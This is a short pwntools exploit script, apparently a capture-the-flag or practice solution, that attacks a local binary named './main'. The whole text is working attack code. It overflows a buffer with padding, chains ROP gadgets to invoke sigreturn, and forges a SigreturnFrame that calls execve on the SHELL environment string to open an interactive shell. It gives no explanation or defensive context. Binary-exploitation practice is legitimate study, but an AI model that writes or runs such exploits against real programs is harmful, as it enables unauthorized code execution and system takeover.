#!/usr/bin/python3

from pwn import *
context.arch = "amd64"
p = process('./main')
print('pid:', p.proc.pid)

pop_rax = 0x401049
syscall = 0x401059
sigreturn_id = 15
execve_id = 59
shell_addr = 0x7fffffffedf4 # env variables SHELL=..., address depends on ASLR

regs = SigreturnFrame()
regs.rax = execve_id
regs.rdi = shell_addr
regs.rsi = 0
regs.rdx = 0
regs.rsp = 0x7fffffffe430 # only true stack is writable in this binary, address depends on ASLR
#regs.rbp = 
regs.rip = syscall
#bytes(regs)

p.sendline(b'qwertyuiopasdfgh' + p64(pop_rax) + p64(sigreturn_id) + p64(syscall) + bytes(regs))
input()
p.sendline(b'\n')

p.interactive()
